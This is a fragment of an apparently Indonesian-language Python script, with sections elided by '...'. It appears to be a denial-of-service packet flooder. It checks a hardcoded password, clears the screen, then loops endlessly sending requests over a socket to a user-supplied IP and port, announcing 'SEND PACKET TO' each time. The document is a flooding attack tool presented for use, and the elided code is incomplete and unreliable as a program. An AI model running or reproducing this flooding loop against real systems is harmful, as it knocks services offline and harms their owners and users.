...
if password == "BedlernGezo":
    print("\033[55m correct password")
    time.sleep(2)
else :
    print("\033[44m Password Salah")
...
print("\033[1;36;44m TUNGGU BEDLERN GEZO BUKA PASS")
time.sleep(5)
os.system("clear")
print("\033[95m")
print("""
    ...
    while True:
        try:
            ...
            for x in range(time):
                ...
                s.sendall(str.encode(request))
                s.sendall(str.encode(request))
            print("\033[1;36;44m SEND PACKET TO ==> %s PORT ==> %s"%(ip,port))
        except socket.error:
            s.close()
            print("\033[1;36;44m SEND PACKET TO ==> %s PORT ==> %s"%(ip,port))
